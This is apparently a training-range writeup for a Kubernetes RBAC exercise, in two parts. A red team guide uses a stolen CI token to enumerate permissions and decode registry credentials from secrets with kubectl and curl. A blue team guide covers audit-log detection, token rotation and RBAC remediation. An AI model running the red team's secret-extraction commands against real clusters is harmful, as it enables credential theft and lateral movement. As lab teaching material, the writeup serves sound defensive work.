# GRIDFALL M3 Kubernetes RBAC Secrets Read Red vs Blue Writeup

## Red Team Writeup

# Solve Guide â€” Red Team
## RNG-CLD-01 | M3 â€” cld-k8s | Kubernetes RBAC Over-Privilege â†’ Secrets Read
**Technique:** T1613 / T1552.007 â€” Container API / Kubernetes Secrets  
**Pivot In:** K8s token `pul-cloud-ci-runner-token-2024gridfall` from M2 kubeconfig

## Objective
Use the stolen service account token to authenticate to the K3s API server, enumerate the over-privileged RBAC policy, and read the `registry-creds` secret to obtain credentials for the container registry on M4.



## Step 1 â€” Configure kubectl with Stolen Kubeconfig
```bash
export KUBECONFIG=./cloud-ci-kubeconfig.yaml
# Verify connection
kubectl cluster-info
# Kubernetes control plane is running at https://193.0.3.80:6443
```

## Step 2 â€” Enumerate Namespace Resources
```bash
# List what we can see
kubectl get all -n pul-cloud
kubectl api-resources --verbs=list --namespaced -n pul-cloud

# Check permissions explicitly
kubectl auth can-i --list -n pul-cloud
# get     secrets    YES  â† over-privileged
# list    secrets    YES  â† over-privileged
# get     pods       YES
# get     configmaps YES
```

## Step 3 â€” Enumerate Secrets
```bash
kubectl get secrets -n pul-cloud
# NAME             TYPE     DATA   AGE
# registry-creds   Opaque   4      Xh
# db-creds         Opaque   5      Xh
```

## Step 4 â€” Extract Registry Credentials (THE GOAL)
```bash
# Method 1: kubectl jsonpath
kubectl get secret registry-creds -n pul-cloud \
    -o jsonpath='{.data.username}' | base64 -d
# registry-admin

kubectl get secret registry-creds -n pul-cloud \
    -o jsonpath='{.data.password}' | base64 -d
# Reg!stry@CLD2024

# Method 2: full decode
kubectl get secret registry-creds -n pul-cloud -o json | \
    python3 -c "
import sys, json, base64
d = json.load(sys.stdin)['data']
for k, v in d.items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"
# username: registry-admin
# password: Reg!stry@CLD2024
# registry: 11.0.2.40:5000
```

**Or via raw curl (no kubectl needed):**
```bash
TOKEN="pul-cloud-ci-runner-token-2024gridfall"
curl -sk -H "Authorization: Bearer ${TOKEN}" \
    https://193.0.3.80:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds \
    | python3 -c "
import sys, json, base64
d = json.load(sys.stdin)['data']
for k, v in d.items():
    print(k, '=', base64.b64decode(v).decode())
"
```

## Step 5 â€” Verify Registry Credentials Against M4
```bash
curl -u "registry-admin:Reg!stry@CLD2024" \
    http://11.0.2.40:5000/v2/_catalog
# {"repositories":["pul-cloud/platform-svc"]}
```

Pivot to M4 confirmed.

## Summary
| Item | Value |
|---|---|
| Vulnerability | RBAC grants CI runner access to Secrets (should be denied) |
| Stolen Secret | registry-creds in pul-cloud namespace |
| Registry Creds | registry-admin:Reg!stry@CLD2024 @ 11.0.2.40:5000 |
| Next Target | M4 Container Registry (11.0.2.40:5000) |
| MITRE | T1613, T1552.007 |

---

## Blue Team Writeup

# Solve Guide â€” Blue Team
## RNG-CLD-01 | M3 â€” cld-k8s | K8s RBAC Audit & Secrets Protection

## Detection

### 1. K3s API Server Audit Logs
```bash
# K3s API audit log (if enabled) or journalctl
journalctl -u k3s | grep "secrets" | grep -v "watch" | tail -30

# Specifically look for GET on registry-creds
journalctl -u k3s | grep "registry-creds" | grep "200"
```

### 2. Detect Unusual Token Usage
The static token `pul-cloud-ci-runner-token-2024gridfall` should only be used from CI/CD pipeline IPs. Unexpected source IPs using this token indicate compromise:
```bash
journalctl -u k3s | grep "pul-cloud-ci-runner"
# Filter by source IP â€” any IP outside CI/CD ranges is suspicious
```

### 3. RBAC Review â€” Identify the Misconfiguration
```bash
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml

# Show what cloud-ci-runner-role grants
kubectl describe role cloud-ci-runner-role -n pul-cloud
# Find "secrets" under resources: and "get,list" under verbs: â€” THIS IS THE PROBLEM

# Check all roles that have secrets access
kubectl get roles -n pul-cloud -o yaml | grep -A5 "secrets"
```

## Containment
```bash
# 1. Invalidate the stolen static token immediately
# Edit /etc/rancher/k3s/tokens.csv and replace the token value
sudo sed -i 's/pul-cloud-ci-runner-token-2024gridfall/NEW-ROTATED-TOKEN-HERE/' \
    /etc/rancher/k3s/tokens.csv
sudo systemctl restart k3s

# 2. Remove secrets from RBAC role
kubectl edit role cloud-ci-runner-role -n pul-cloud
# Delete the "secrets" resource entry entirely

# 3. Rotate registry-creds secret value
kubectl create secret generic registry-creds \
    --from-literal=username=registry-admin \
    --from-literal=password='NewReg!stry@CLD2025' \
    --from-literal=registry=11.0.2.40:5000 \
    -n pul-cloud --dry-run=client -o yaml | kubectl apply -f -
# Also update htpasswd on M4 registry to match
```

## Remediation
1. **CI/CD runners must not have Secrets access** â€” use projected service account tokens or external secrets operator
2. Enable Kubernetes Audit Policy to log all Secrets reads to SIEM
3. Replace static long-lived tokens with short-lived, auto-rotating service account tokens (K8s 1.24+ default)
4. Implement Network Policy to restrict which pods can reach the API server
5. Use OPA Gatekeeper or Kyverno to block Role/ClusterRole creation granting secrets access without approval

## Blue Team Checklist
- [ ] Unauthorized Secrets read confirmed in API audit logs
- [ ] Static token rotated in tokens.csv
- [ ] cloud-ci-runner-role patched to remove secrets access
- [ ] registry-creds password rotated (also update M4 htpasswd)
- [ ] db-creds password rotated as precaution
- [ ] Audit policy enabled for ongoing secrets monitoring

